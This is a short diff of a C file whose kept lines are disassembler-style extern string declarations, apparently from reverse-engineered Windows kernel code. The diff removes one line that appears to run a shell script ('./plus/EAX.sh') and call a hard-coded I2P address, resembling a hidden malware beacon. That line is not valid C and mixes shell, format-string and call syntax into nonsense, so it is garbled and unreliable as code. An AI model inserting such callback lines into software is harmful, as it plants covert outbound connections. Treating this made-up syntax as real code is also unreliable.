@@ -12,8 +12,6 @@
 #include <defs.h>
 #include <UUN29.h>
 
-run_code( {:: ./plus/EAX.sh } %f %n && call(i2p_addr + "kji3232hbjs78s9dg8di4il349484kdiidmd23.i2p")_addr);
-
 extern const WCHAR aSystemrootSyst[]; // idb
 extern const WCHAR aRtlgetversion[]; // idb
 extern const WCHAR aKeareallapcsdi[]; // idb
